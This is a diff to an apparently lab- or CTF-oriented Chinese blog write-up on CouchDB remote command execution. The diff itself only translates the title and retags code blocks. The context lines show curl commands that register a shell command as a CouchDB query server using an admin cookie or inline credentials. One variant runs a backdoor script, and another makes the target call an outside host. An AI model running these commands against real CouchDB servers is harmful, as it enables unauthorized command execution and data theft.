@@ -1,6 +1,6 @@
 ---
 layout:     post
-title:      "Couchdb命令执行"
+title:      "Remote Command Execution via CouchDB"
 date:       2016-09-11
 categories: [Pentest, Database, Remote Command Execution, CouchDB]
 
@@ -27,7 +27,7 @@ Couchdb默认会在5984端口开放Restful的API接口，如果使用SSL的话�
 2. 新建一个临时库和临时表，插入一条记录；
 3. 调用query_server处理数据
 
-```basic
+```bash
 curl -X PUT 'http://192.168.199.181:5984/_config/query_servers/cmd' -d '"python /tmp/back.py"'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"
 
 curl -X PUT 'http://192.168.199.181:5984/teeest'  -H "Cookie: AuthSession=YWRtaW46NTc5QTRGMjc6VKTKwNEud9fFchzR-HtOrjM5Cg4"```
@@ -49,7 +49,7 @@ getshell，读取flag
 ![成功](https://urahara3389.github.io/static/img/posts/CouchDB/Couchdb-RCE-over.png)
 > 同样你也可以不用登录获取Cookie，直接在curl请求中带入账号密码也是可以的，类似于这样，执行效果是一样的，这种方法可能更方便点吧
 
-```basic
+```bash
 root@Urahara:~# curl -X PUT 'admin:1qaz2wsx@192.168.199.165:5984/_config/query_servers/cmd' -d '"curl http://192.168.199.140/flag"'
 "curl http://192.168.199.140/flag"
 root@Urahara:~# curl -X PUT 'admin:1qaz2wsx@192.168.199.165:5984/wa'
